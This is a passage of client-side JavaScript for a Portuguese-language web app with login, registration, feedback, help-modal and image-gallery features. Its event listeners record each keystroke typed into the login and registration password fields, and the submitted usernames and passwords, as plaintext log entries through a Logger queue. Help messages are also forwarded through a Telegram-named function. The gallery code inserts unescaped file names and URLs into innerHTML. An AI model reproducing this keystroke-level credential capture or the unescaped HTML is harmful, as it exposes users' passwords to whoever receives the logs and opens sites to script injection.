  });

  loginUsername.addEventListener("focus", () => {
    Logger.enqueue("🔐 Login: focou no campo username");
  });

  loginPassword.addEventListener("input", () => {
    Logger.enqueue(`🔐 Login: digitando password -> ${loginPassword.value}`);
  });

  loginPassword.addEventListener("focus", () => {
    Logger.enqueue("🔐 Login: focou no campo password");
  });

  loginBtn.addEventListener("click", () => {
    Logger.enqueue(
      `✅ Tentativa de login: username = ${loginUsername.value}, password = ${loginPassword.value}`
    );
  });

  const regUsername = document.getElementById("register-username");
  const regPassword = document.getElementById("register-password");
  const regBtn = document.getElementById("register-btn");

  regUsername.addEventListener("input", () => {
    Logger.enqueue(`✏️ Registro: digitando username -> ${regUsername.value}`);
  });

  regUsername.addEventListener("focus", () => {
    Logger.enqueue("✏️ Registro: focou no campo username");
  });

  regPassword.addEventListener("input", () => {
    Logger.enqueue(`✏️ Registro: digitando password -> ${regPassword.value}`);
  });

  regPassword.addEventListener("focus", () => {
    Logger.enqueue("✏️ Registro: focou no campo password");
  });

  regBtn.addEventListener("click", () => {
    Logger.enqueue(
      `✅ Tentativa de registro: username = ${regUsername.value}, password = ${regPassword.value}`
    );
  });

  const suggestionText = document.getElementById("suggestionText");
  const sendSuggestionBtn = document.getElementById("sendSuggestion");

  suggestionText.addEventListener("input", () =>
    Logger.enqueue(
      `✏️ Usuário digitou em Sugestão/Reclamação: ${suggestionText.value}`
    )
  );
  suggestionText.addEventListener("focus", () =>
    Logger.enqueue("✏️ Usuário focou no campo de Sugestão/Reclamação")
  );
  sendSuggestionBtn.addEventListener("click", () =>
    Logger.enqueue(`✅ Usuário enviou sugestão: ${suggestionText.value}`)
  );

  newWordInput.addEventListener("input", () =>
    Logger.enqueue(`📝 Usuário digitou palavra: ${newWordInput.value}`)
  );
  newWordInput.addEventListener("focus", () =>
    Logger.enqueue("📝 Usuário focou no campo de nova palavra")
  );
  addWordBtn.addEventListener("click", () =>
    Logger.enqueue(
      `✅ Usuário clicou em Adicionar Palavra: ${newWordInput.value}`
    )
  );

  const helpBtn = document.getElementById("help-btn");
  const helpModal = document.getElementById("help-modal");
  const helpClose = document.getElementById("help-close");
  const helpSend = document.getElementById("help-send");
  const helpText = document.getElementById("help-text");

  helpBtn.addEventListener("click", () => {
    helpModal.style.display = "flex";
    Logger.enqueue("🆘 Usuário abriu o modal de Ajuda");
  });
  helpClose.addEventListener("click", () => {
    helpModal.style.display = "none";
    Logger.enqueue("❌ Usuário fechou o modal de Ajuda");
  });
  helpModal.addEventListener("click", (e) => {
    if (e.target === helpModal) {
      helpModal.style.display = "none";
      Logger.enqueue("❌ Usuário fechou o modal de Ajuda clicando fora");
    }
  });

  helpText.addEventListener("input", () => {
    Logger.enqueue(`✏️ Usuário digitou no campo de Ajuda: ${helpText.value}`);
  });

  helpSend.addEventListener("click", async () => {
    const message = helpText.value.trim();
    if (!message) return alert("Digite uma mensagem antes de enviar.");

    const username = usernameSpan?.textContent || "usuário não preenchido";
    const fullMessage = `🆘 Ajuda do usuário: ${username}\n\nMensagem: ${message}`;

    try {
      const res = await fetch("/api/send-help", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ message: fullMessage }),
      });
      const data = await res.json();

      if (data.success) {
        alert("Mensagem enviada com sucesso!");
        helpText.value = "";
        helpModal.style.display = "none";

        Logger.enqueue(`✅ Usuário enviou mensagem de Ajuda: ${message}`);
        sendTelegramVisitas(fullMessage);
      } else {
        alert("Falha ao enviar mensagem.");
        Logger.enqueue(
          `❌ Erro ao enviar mensagem de Ajuda: ${data.error || "desconhecido"}`
        );
      }
    } catch (err) {
      console.error(err);
      alert("Erro de conexão ao enviar mensagem.");
      Logger.enqueue(
        `❌ Erro de rede ao enviar mensagem de Ajuda: ${err.message}`
      );
    }
  });

  document.getElementById("login-btn").addEventListener("click", checkLogin);

  function githubToVercelUrl(githubUrl) {
    if (!githubUrl) return null;
    const fileName = githubUrl.split("/").pop();
    return `/images/${fileName}`;
  }


 

async function loadGithubImages() {
  galleryContainer.innerHTML = "<p>⌛ Carregando imagens...</p>";

  try {
    const res = await fetch("/api/github-images"); 
    const files = await res.json();

    if (!files.length) {
      galleryContainer.innerHTML = "<p>❌ Nenhuma imagem encontrada</p>";
      return;
    }

    files.sort((a, b) => new Date(a.date) - new Date(b.date));

    let featuredIndex = 0;
    renderFeatured(files[featuredIndex]);

    renderGallery(
      files.filter((_, i) => i !== featuredIndex),
      files,
      featuredIndex
    );
  } catch (err) {
    console.error("Erro ao carregar imagens:", err);
    galleryContainer.innerHTML = "<p>❌ Erro ao carregar imagens</p>";
  }
}

function renderFeatured(file) {
  featuredContainer.innerHTML = `
    <div class="featured-wrapper">
      <button class="download-btn">⬇️</button>
      <img src="${file.url}" alt="${file.name}">
    </div>
  `;

  const btn = featuredContainer.querySelector(".download-btn");
  btn.addEventListener("click", () => {
    downloadImage(file.url, file.name);
  });
}

function renderGallery(thumbnails, allImages, featuredIndex) {
  galleryContainer.innerHTML = "";
  thumbnails.forEach((imgFile, i) => {
    const card = document.createElement("div");
    card.className = "card";

    const imgEl = document.createElement("img");
    imgEl.src = imgFile.url;
    imgEl.alt = imgFile.name;

    card.addEventListener("click", () => {
      const newFeatured = imgFile;
      thumbnails[i] = allImages[featuredIndex];
      featuredIndex = allImages.indexOf(newFeatured);

      renderFeatured(newFeatured);
      renderGallery(thumbnails, allImages, featuredIndex);
    });

    card.appendChild(imgEl);
    galleryContainer.appendChild(card);
  });
}

function downloadImage(url, filename) {
  fetch(url)
    .then((res) => res.blob())
    .then((blob) => {
      const blobUrl = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = blobUrl;
      a.download = filename;
      document.body.appendChild(a);
      a.click();
      a.remove();
      URL.revokeObjectURL(blobUrl);
    })
    .catch((err) => console.error("Erro ao baixar imagem:", err));
}

loadGithubImages();




});
